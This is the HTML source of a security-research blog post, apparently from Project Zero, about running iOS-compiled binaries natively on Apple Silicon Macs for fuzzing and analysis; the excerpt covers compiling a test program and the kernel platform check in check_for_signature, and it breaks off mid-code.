0}.lst-kix_ii04ufl4nr9k-7&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-7}ol.lst-kix_ii04ufl4nr9k-5.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-5 0}ol.lst-kix_adz5e91jwu7t-1{list-style-type:none}ol.lst-kix_aacxccbo6zlx-5{list-style-type:none}.lst-kix_adz5e91jwu7t-1&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-1}ol.lst-kix_adz5e91jwu7t-2{list-style-type:none}ol.lst-kix_aacxccbo6zlx-6{list-style-type:none}ol.lst-kix_adz5e91jwu7t-3{list-style-type:none}ol.lst-kix_adz5e91jwu7t-6.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-6 0}ol.lst-kix_aacxccbo6zlx-7{list-style-type:none}ol.lst-kix_adz5e91jwu7t-4{list-style-type:none}ol.lst-kix_aacxccbo6zlx-6.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-6 0}ol.lst-kix_aacxccbo6zlx-8{list-style-type:none}ol.lst-kix_adz5e91jwu7t-5{list-style-type:none}ol.lst-kix_adz5e91jwu7t-6{list-style-type:none}ol.lst-kix_adz5e91jwu7t-7{list-style-type:none}ol.lst-kix_adz5e91jwu7t-8{list-style-type:none}.lst-kix_kfxac5q5c62u-4&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-4}.lst-kix_ghczzllgiqkw-1&gt;li:before{content:"-  "}.lst-kix_adz5e91jwu7t-7&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-7}.lst-kix_adz5e91jwu7t-4&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-4}.lst-kix_ghczzllgiqkw-2&gt;li:before{content:"-  "}.lst-kix_ghczzllgiqkw-7&gt;li:before{content:"-  "}.lst-kix_ghczzllgiqkw-0&gt;li:before{content:"-  "}.lst-kix_ghczzllgiqkw-8&gt;li:before{content:"-  "}ol.lst-kix_ii04ufl4nr9k-4.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-4 0}.lst-kix_kfxac5q5c62u-0&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-0,decimal) ". "}.lst-kix_kfxac5q5c62u-1&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-1,lower-latin) ". "}.lst-kix_ghczzllgiqkw-6&gt;li:before{content:"-  "}.lst-kix_kfxac5q5c62u-2&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-2,lower-roman) ". "}.lst-kix_ghczzllgiqkw-5&gt;li:before{content:"-  "}.lst-kix_ghczzllgiqkw-3&gt;li:before{content:"-  "}ol.lst-kix_aacxccbo6zlx-5.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-5 0}ol.lst-kix_kfxac5q5c62u-5.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-5 0}.lst-kix_kfxac5q5c62u-3&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-3,decimal) ". "}.lst-kix_ghczzllgiqkw-4&gt;li:before{content:"-  "}.lst-kix_kfxac5q5c62u-6&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-6,decimal) ". "}.lst-kix_aacxccbo6zlx-7&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-7}.lst-kix_ii04ufl4nr9k-1&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-1,lower-latin) ". "}ol.lst-kix_aacxccbo6zlx-7.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-7 0}ol.lst-kix_adz5e91jwu7t-5.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-5 0}.lst-kix_kfxac5q5c62u-4&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-4,lower-latin) ". "}.lst-kix_kfxac5q5c62u-8&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-8,lower-roman) ". "}.lst-kix_kfxac5q5c62u-5&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-5,lower-roman) ". "}.lst-kix_ii04ufl4nr9k-0&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-0,decimal) ". "}.lst-kix_ii04ufl4nr9k-3&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-3,decimal) ". "}.lst-kix_ii04ufl4nr9k-4&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-4}.lst-kix_kfxac5q5c62u-8&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-8}.lst-kix_kfxac5q5c62u-7&gt;li:before{content:"" counter(lst-ctn-kix_kfxac5q5c62u-7,lower-latin) ". "}.lst-kix_ii04ufl4nr9k-2&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-2,lower-roman) ". "}ol.lst-kix_aacxccbo6zlx-4.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-4 0}.lst-kix_ii04ufl4nr9k-7&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-7,lower-latin) ". "}ol.lst-kix_adz5e91jwu7t-8.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-8 0}.lst-kix_adz5e91jwu7t-8&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-8}.lst-kix_ii04ufl4nr9k-4&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-4,lower-latin) ". "}.lst-kix_ii04ufl4nr9k-8&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-8,lower-roman) ". "}ol.lst-kix_ii04ufl4nr9k-7.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-7 0}.lst-kix_ii04ufl4nr9k-3&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-3}.lst-kix_kfxac5q5c62u-7&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-7}.lst-kix_ii04ufl4nr9k-5&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-5,lower-roman) ". "}.lst-kix_ii04ufl4nr9k-6&gt;li:before{content:"" counter(lst-ctn-kix_ii04ufl4nr9k-6,decimal) ". "}ol.lst-kix_aacxccbo6zlx-1.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-1 0}.lst-kix_ii04ufl4nr9k-2&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-2}.lst-kix_ii04ufl4nr9k-5&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-5}ol.lst-kix_kfxac5q5c62u-6.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-6 0}ol.lst-kix_adz5e91jwu7t-0{list-style-type:none}.lst-kix_aacxccbo6zlx-8&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-8}ol.lst-kix_kfxac5q5c62u-3.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-3 0}ul.lst-kix_hvcf6tgq957j-0{list-style-type:none}ul.lst-kix_hvcf6tgq957j-5{list-style-type:none}ul.lst-kix_hvcf6tgq957j-6{list-style-type:none}ul.lst-kix_hvcf6tgq957j-7{list-style-type:none}ul.lst-kix_hvcf6tgq957j-8{list-style-type:none}.lst-kix_aacxccbo6zlx-5&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-5}ul.lst-kix_hvcf6tgq957j-1{list-style-type:none}ol.lst-kix_kfxac5q5c62u-0.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-0 0}ul.lst-kix_hvcf6tgq957j-2{list-style-type:none}.lst-kix_adz5e91jwu7t-6&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-6}ul.lst-kix_ghczzllgiqkw-8{list-style-type:none}ul.lst-kix_hvcf6tgq957j-3{list-style-type:none}ul.lst-kix_hvcf6tgq957j-4{list-style-type:none}ol.lst-kix_aacxccbo6zlx-2.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-2 0}ol.lst-kix_adz5e91jwu7t-3.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-3 0}ol.lst-kix_ii04ufl4nr9k-8.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-8 0}.lst-kix_aacxccbo6zlx-1&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-1,lower-latin) ". "}.lst-kix_aacxccbo6zlx-0&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-0,decimal) ". "}.lst-kix_adz5e91jwu7t-5&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-5}.lst-kix_aacxccbo6zlx-3&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-3,decimal) ". "}.lst-kix_aacxccbo6zlx-2&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-2,lower-roman) ". "}.lst-kix_aacxccbo6zlx-6&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-6,decimal) ". "}.lst-kix_ii04ufl4nr9k-6&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-6}ol.lst-kix_kfxac5q5c62u-1.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-1 0}.lst-kix_aacxccbo6zlx-5&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-5,lower-roman) ". "}.lst-kix_ii04ufl4nr9k-0&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-0}ol.lst-kix_ii04ufl4nr9k-2.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-2 0}.lst-kix_aacxccbo6zlx-4&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-4,lower-latin) ". "}.lst-kix_kfxac5q5c62u-6&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-6}.lst-kix_kfxac5q5c62u-3&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-3}ol.lst-kix_ii04ufl4nr9k-2{list-style-type:none}.lst-kix_aacxccbo6zlx-7&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-7,lower-latin) ". "}ol.lst-kix_ii04ufl4nr9k-3{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-0{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-1{list-style-type:none}.lst-kix_aacxccbo6zlx-3&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-3}ol.lst-kix_aacxccbo6zlx-8.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-8 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_adz5e91jwu7t-2&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-2}.lst-kix_hvcf6tgq957j-8&gt;li:before{content:"\0025a0  "}.lst-kix_kfxac5q5c62u-0&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-0}.lst-kix_aacxccbo6zlx-6&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-6}.lst-kix_aacxccbo6zlx-8&gt;li:before{content:"" counter(lst-ctn-kix_aacxccbo6zlx-8,lower-roman) ". "}ol.lst-kix_ii04ufl4nr9k-8{list-style-type:none}ol.lst-kix_kfxac5q5c62u-2.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-2 0}ol.lst-kix_ii04ufl4nr9k-6{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-7{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-4{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-5{list-style-type:none}ol.lst-kix_kfxac5q5c62u-8.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-8 0}ol.lst-kix_ii04ufl4nr9k-1.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-1 0}ol.lst-kix_adz5e91jwu7t-2.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-2 0}ol{margin:0;padding:0}table td,table th{padding:0}.c13{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:Consolas,"Courier New";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:Consolas,"Courier New";font-style:normal}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.c9{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c20{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c17{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c7{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c15{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c18{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c11{font-weight:400;font-family:Consolas,"Courier New"}.c8{padding:0;margin:0}.c5{border:1px solid black;margin:5px}.c10{color:inherit;text-decoration:inherit}.c1{margin-left:36pt;padding-left:0pt}.c16{font-family:Consolas,"Courier New";font-weight:700}.c4{height:11pt}.c14{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c19"&gt; &lt;p class="c20 subtitle" id="h.57asgx9sxnba"&gt;&lt;span class="c17"&gt;Or how iOS apps on macOS work under the hood&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;Posted by Samuel Gro&amp;szlig;, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;This short post explains how code compiled for iOS can be run natively on Apple Silicon Macs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;With the introduction of &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/apple_silicon"&gt;Apple Silicon Macs&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, Apple also made it possible to run iOS apps natively on these Macs. This is fundamentally possible due to (1) iPhones and Apple Silicon Macs both using the arm64 instruction set architecture (ISA) and (2) macOS using a mostly compatible set of runtime libraries and frameworks while also providing /System/iOSSupport which contains the parts of the iOS runtime that do not exist on macOS. &lt;/span&gt;&lt;span class="c6"&gt;Due to this, it should be possible to run not just complete apps but also standalone iOS binaries or libraries on Mac. This might be interesting for a number of reasons, including:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c8 lst-kix_ghczzllgiqkw-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span class="c6"&gt;It allows fuzzing closed-source code compiled for iOS on a Mac&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span class="c6"&gt;It allows dynamic analysis of iOS code in a more &amp;ldquo;friendly&amp;rdquo; environment&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This post explains how this can be achieved in practice. The corresponding code can be found &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/googleprojectzero/p0tools/tree/master/iOSOnMac"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and allows &lt;/span&gt;&lt;span&gt;executing arbitrary iOS binaries and library code natively on macOS. The tool assumes that &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection"&gt;SIP has been disabled&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and has been tested on macOS 11.2 and 11.3&lt;/span&gt;&lt;span class="c6"&gt;. With SIP enabled, certain steps will probably fail.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;We originally developed this tool for fuzzing a 3rd-party iOS messaging app. While that particular project didn&amp;rsquo;t yield any interesting results, we are making the tool public as it could help lower the barrier of entry for iOS security research.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.aw851uzeigjt"&gt;&lt;span class="c12"&gt;The Goal&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;The ultimate goal of this project is to execute code compiled for iOS natively on macOS. While it would be possible to achieve this goal (at least for some binaries/libraries) simply by swapping the platform identifier in the mach-o binary, our approach will instead use the existing infrastructure for running iOS apps on macOS. This has two benefits:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c8 lst-kix_aacxccbo6zlx-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span class="c6"&gt;It will guarantee that all dependent system libraries of the iOS code will exist. In practice, this means that if a dependent library does not already exist on macOS, it will automatically be loaded from /System/iOSSupport instead&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span class="c6"&gt;The runtime (OS services, frameworks, etc.) will, if necessary, emulate their iOS behavior since they will know that the process is an iOS one&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;To start, we&amp;rsquo;ll take a simple piece of C source code and compile it for iOS:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; cat hello.c&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;int main() {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; puts(&amp;quot;Hello from an iOS binary!&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; return 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; clang -arch arm64 hello.c -o hello -isysroot \&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c13"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; file hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;hello: Mach-O 64-bit executable arm64&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; otool -l hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;Load command 10&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; cmd LC_BUILD_VERSION&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; cmdsize 32&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp;platform 2 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # Platform 2 is iOS&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; minos 14.4&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sdk 14.4&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp;ntools 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;tool 3&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; version 609.8&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.e03m0s8m33wi"&gt;&lt;span class="c12"&gt;The Kernel&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;Attempting&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;to execute the freshly compiled binary (on macOS 11.2) will simply result in&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; ./hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;[1] &amp;nbsp; &amp;nbsp;13699 killed &amp;nbsp; &amp;nbsp; ./hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;While the exit status informs us that the process was terminated through SIGKILL, it does not contain any additional information about the specific reason for that. However, it does seem likely that the process is terminated by the kernel during the &lt;/span&gt;&lt;span class="c11"&gt;execve(2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c11"&gt;posix_spawn(2)&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;syscall. And indeed, the crash report generated by the system states: &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;Termination Reason: &amp;nbsp; &amp;nbsp;EXEC, [0xe] Binary with wrong platform&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This error correspon&lt;/span&gt;&lt;span&gt;ds to &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/bsd/sys/reason.h#L249"&gt;EXEC_EXIT_REASON_WRONG_PLATFORM&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the kernel&lt;/span&gt;&lt;span&gt;, and that constant is only referenced in a single function: &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/bsd/kern/kern_exec.c#L6768"&gt;check_for_signature&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;static int&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;check_for_signature(proc_t p, struct image_params *imgp)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;hellip;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#if XNU_TARGET_OS_OSX&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/* Check for platform passed in spawn attr if iOS binary is being spawned */&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if (proc_platform(p) == PLATFORM_IOS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;struct _posix_spawnattr *psa = imgp-&amp;gt;ip_px_sa;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if (psa == NULL || psa-&amp;gt;psa_platform == 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;hellip;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; signature_failure_reason = os_reason_create(OS_REASON_EXEC,&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c11 c14"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c14 c16"&gt;EXEC_EXIT_REASON_WRONG_PLATFORM&lt;/span&gt;&lt;span 